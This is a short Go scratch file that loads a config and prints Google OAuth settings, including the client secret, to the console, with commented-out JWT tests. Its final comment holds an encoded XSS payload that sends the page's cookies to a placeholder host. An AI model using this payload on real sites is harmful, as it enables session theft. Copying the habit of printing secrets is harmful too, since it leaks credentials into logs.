package main

import (
	"fmt"

	"musicproject.com/config"
)

func main() {
	//flag.
	cfg := config.ReadConfigFile("config/base.yml")

	// fmt.Println(cfg.APIConfig.Port)
	// fmt.Println(cfg.RepositoryConfig.Type)
	// fmt.Println(cfg.RepositoryConfig.URL)
	oauthCfg := cfg.GoogleOathConfig()

	// fmt.Println(cfg.Oauth.Google.ClientID)
	// fmt.Println(cfg.Oauth.Google.ClientSecret)
	// //fmt.Println(cfg.Oauth2Config.Google.Endpoint)
	// fmt.Println(cfg.Oauth.Google.RedirectURL)
	// fmt.Println(cfg.Oauth.Google.Scopes)
	//fmt.Println(time.Now().Unix())
	fmt.Println(oauthCfg.ClientID)
	fmt.Println(oauthCfg.ClientSecret)
	fmt.Println(oauthCfg.RedirectURL)
	fmt.Println(oauthCfg.Scopes)

	// token := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.RegisteredClaims{
	// 	ExpiresAt: jwt.NewNumericDate(time.Now().Add(time.Second * -10)),
	// })
	// fmt.Println(token.Valid)
	//jwt.NewNumericDate()
	//"http://127.0.0.1/?name=&#60;script&#62;document.location.href='http://www.xxx.com/cookie?'+document.cookie&#60;/script&#62;"
}
